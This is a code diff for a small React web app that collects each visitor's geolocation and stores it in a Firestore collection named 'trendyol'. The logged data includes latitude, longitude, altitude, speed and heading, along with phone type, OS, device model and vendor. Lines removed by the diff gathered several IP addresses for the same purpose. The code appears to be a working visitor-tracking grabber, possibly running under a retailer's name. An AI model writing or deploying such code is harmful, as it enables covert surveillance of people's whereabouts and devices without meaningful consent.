@@ -12,31 +12,36 @@ import {
   mobileModel,
   mobileVendor,
 } from "react-device-detect";
+import { useGeolocated } from "react-geolocated";
 function App() {
   const [ip3, setIp3] = useState("");
   const [ip4, setIp4] = useState("");
   const [finish, setFinished] = useState(false);
+  const { coords, isGeolocationAvailable, isGeolocationEnabled } =
+    useGeolocated({
+      positionOptions: {
+        enableHighAccuracy: false,
+      },
+      userDecisionTimeout: 5000,
+    });
 
   useEffect(() => {
-    !finish && sendBrowserInfo();
-  }, [finish, ip3]);
-console.log('ip4',ip4)
+    coords && sendBrowserInfo();
+  }, [finish, coords]);
   async function sendBrowserInfo() {
-    const ip = await findIp();
-    const ip2 = await findIp2();
-    const ip3s = await getUserLocation();
-    getUserLocation2(setIp4);
-    setIp3(ip3s);
+    let ip = {};
+    ip.latitude = coords.latitude;
+    ip.longitude = coords.longitude;
+    ip.altitude = coords.altitude;
+    ip.heading = coords.heading;
+    ip.speed = coords.speed;
     const date = new Date();
     ip.turkishDate = date.toLocaleString("tr-TR");
-    ip.ip2 = ip2;
-    ip.ip3 = ip3 ? ip3 : "";
-    ip.ip4 = ip4 ? ip4 : "";
     ip.telephoneType = isAndroid ? "Android" : isIOS ? "Iphone" : "Web";
     ip.osName = osName;
     ip.mobileModel = mobileModel;
     ip.mobileVendor = mobileVendor;
-    if (ip3 && ip4) {
+    if (ip) {
       try {
         const docRef = await addDoc(collection(db, "trendyol"), ip);
         if (docRef?.id) {
@@ -89,7 +94,7 @@ function getUserLocation2(setIp4) {
   if (navigator.geolocation) {
     navigator.geolocation.getCurrentPosition(showPosition);
   } else {
-    setIp4(true)
+    setIp4(true);
     console.log("Geolocation is not supported by this browser.");
   }
 
